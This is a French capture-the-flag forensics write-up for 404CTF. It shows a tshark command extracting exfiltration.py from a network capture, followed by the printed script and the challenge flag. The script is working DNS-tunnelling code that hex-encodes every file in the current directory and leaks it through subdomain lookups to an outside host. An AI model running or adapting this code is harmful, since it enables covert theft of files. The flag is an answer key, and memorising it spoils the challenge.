Un agent compromis [1/3]
871

Nous avons surpris un de nos agents en train d'envoyer des fichiers confidentiels depuis son ordinateur dans nos locaux vers Hallebarde. Malheureusement, il a eu le temps de finir l'exfiltration et de supprimer les fichiers en question avant que nous l'arrêtions.

Heureusement, nous surveillons ce qu'il se passe sur notre réseau et nous avons donc une capture réseau de l'activité de son ordinateur. Retrouvez le fichier qu'il a téléchargé pour exfiltrer nos fichiers confidentiels.

Auteur : Typhlos#9037

$ tshark -r capture-reseau.pcapng -T fields -e http.request.full_uri -e http.file_data http
http://hallebarde.404ctf.fr/exfiltration.py
	import binascii\nimport os\nimport dns.resolver\nimport time\n\ndef read_file(filename):\n    with open(filename, "rb") as f:\n        return binascii.hexlify(f.read())\n\n\ndef exfiltrate_file(filename):\n    dns.resolver.resolve("never-gonna-give-you-up.hallebarde.404ctf.fr")\n    time.sleep(0.1)\n    dns.resolver.resolve(binascii.hexlify(filename.encode()).decode() + ".hallebarde.404ctf.fr")\n    content = read_file(filename)\n    time.sleep(0.1)\n    dns.resolver.resolve("626567696E.hallebarde.404ctf.fr")\n    time.sleep(0.1)\n    for i in range(len(content)//32):\n        hostname = content[i * 32: i * 32 + 32].decode()\n        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")\n        time.sleep(0.1)\n    if len(content) > (len(content)//32)*32:\n        hostname = content[(len(content)//32)*32:].decode()\n        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")\n        time.sleep(0.1)\n    dns.resolver.resolve("656E64.hallebarde.404ctf.fr")\n    time.sleep(60)\n\n\nif __name__ == "__main__":\n    files = os.listdir()\n    print(files)\n    for file in files:\n        print(file)\n        exfiltrate_file(file)\n\n\nflag = """404CTF{t3l3ch4rg3m3n7_b1z4rr3}"""\n
